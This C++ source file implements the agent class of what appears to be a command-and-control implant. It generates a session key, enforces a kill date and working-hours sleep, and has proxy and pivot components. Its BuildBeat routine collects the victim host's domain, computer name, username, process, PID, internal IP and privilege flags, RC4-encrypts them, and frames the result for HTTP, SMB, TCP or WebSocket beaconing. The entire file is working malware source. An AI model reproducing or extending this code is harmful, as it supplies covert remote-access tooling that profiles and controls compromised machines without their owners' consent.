#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Crypt.h"
#include <random>
#include <algorithm>
#include <cstring>

Agent::Agent()
    : info(std::make_unique<AgentInfo>()),
      config(std::make_unique<AgentConfig>()),
      commander(std::make_unique<Commander>(this)),
      downloader(std::make_unique<Downloader>(config ? config->download_chunk_size : 0)),
      jober(std::make_unique<JobsController>()),
      memorysaver(std::make_unique<MemorySaver>()),
      proxyfire(std::make_unique<Proxyfire>()),
      pivotter(std::make_unique<Pivotter>())
{
    for (auto& byte : session_key) {
        byte = static_cast<std::uint8_t>(GenerateRandom32() % 0x100);
    }
    
    if (config) {
        config->active = true;
    }
}

void Agent::SetActive(bool state)
{
    if (config) {
        config->active = state;
    }
}

bool Agent::IsActive() const
{
    if (!config || !info) {
        return false;
    }
    
    std::uint32_t now = GetSystemTimeAsUnixTimestamp();
    return config->active && !(config->kill_date && now >= config->kill_date);
}

std::uint32_t Agent::GetWorkingSleep() const
{
    if (!config || !config->working_time) {
        return 0;
    }

    std::uint16_t endM   = (config->working_time >> 0) & 0x3F;
    std::uint16_t endH   = (config->working_time >> 8) & 0x3F;
    std::uint16_t startM = (config->working_time >> 16) & 0x3F;
    std::uint16_t startH = (config->working_time >> 24) & 0x3F;

    std::uint32_t newSleepTime = 0;
    SYSTEMTIME SystemTime = {};
    
    if (ApiWin && ApiWin->GetLocalTime) {
        ApiWin->GetLocalTime(&SystemTime);
    } else {
        return 0;
    }

    if (SystemTime.wHour < startH) {
        newSleepTime = (startH - SystemTime.wHour) * 60 + (startM - SystemTime.wMinute);
    }
    else if (endH < SystemTime.wHour) {
        newSleepTime = (24 - SystemTime.wHour - 1) * 60 + (60 - SystemTime.wMinute);
        newSleepTime += startH * 60 + startM;
    }
    else if (SystemTime.wHour == startH && SystemTime.wMinute < startM) {
        newSleepTime = startM - SystemTime.wMinute;
    }
    else if (SystemTime.wHour == endH && endM <= SystemTime.wMinute) {
        newSleepTime = 23 * 60 + (60 + startM - SystemTime.wMinute);
    }
    else {
        return 0;
    }

    return newSleepTime * 60 - SystemTime.wSecond;
}

std::vector<std::uint8_t> Agent::BuildBeat() const
{
    if (!info || !config) {
        return {};
    }

    std::uint8_t flag = 0;
    flag += info->is_server;
    flag <<= 1;
    flag += info->elevated;
    flag <<= 1;
    flag += info->sys64;
    flag <<= 1;
    flag += info->arch64;

    auto packer = std::make_unique<Packer>();

    packer->Pack32(config->agent_type);
    packer->Pack32(info->agent_id);
    packer->Pack32(config->sleep_delay);
    packer->Pack32(config->jitter_delay);
    packer->Pack32(config->kill_date);
    packer->Pack32(config->working_time);
    packer->Pack16(info->acp);
    packer->Pack16(info->oemcp);
    packer->Pack8(info->gmt_offest);
    packer->Pack16(info->pid);
    packer->Pack16(info->tid);
    packer->Pack32(info->build_number);
    packer->Pack8(info->major_version);
    packer->Pack8(info->minor_version);
    packer->Pack32(info->internal_ip);
    packer->Pack8(flag);
    packer->PackBytes(session_key.data(), session_key.size());
    packer->PackStringA(info->domain_name);
    packer->PackStringA(info->computer_name);
    packer->PackStringA(info->username);
    packer->PackStringA(info->process_name);

    auto* packed_data = packer->data();
    auto packed_size = packer->datasize();
    
    EncryptRC4(packed_data, packed_size, config->encrypt_key, 16);

    MemFreeLocal(reinterpret_cast<LPVOID*>(&info->domain_name),   StrLenA(info->domain_name));
    MemFreeLocal(reinterpret_cast<LPVOID*>(&info->computer_name), StrLenA(info->computer_name));
    MemFreeLocal(reinterpret_cast<LPVOID*>(&info->username),      StrLenA(info->username));
    MemFreeLocal(reinterpret_cast<LPVOID*>(&info->process_name),  StrLenA(info->process_name));

    std::vector<std::uint8_t> result;

#if defined(BEACON_HTTP)
    result.assign(packed_data, packed_data + packed_size);

#elif defined(BEACON_SMB) || defined(BEACON_TCP)
    result.reserve(packed_size + sizeof(std::uint32_t));
    const auto* listener_bytes = reinterpret_cast<const std::uint8_t*>(&config->listener_type);
    result.insert(result.end(), listener_bytes, listener_bytes + sizeof(std::uint32_t));
    result.insert(result.end(), packed_data, packed_data + packed_size);

#elif defined(BEACON_WS)
    result.assign(packed_data, packed_data + packed_size);
#endif

    return result;
}
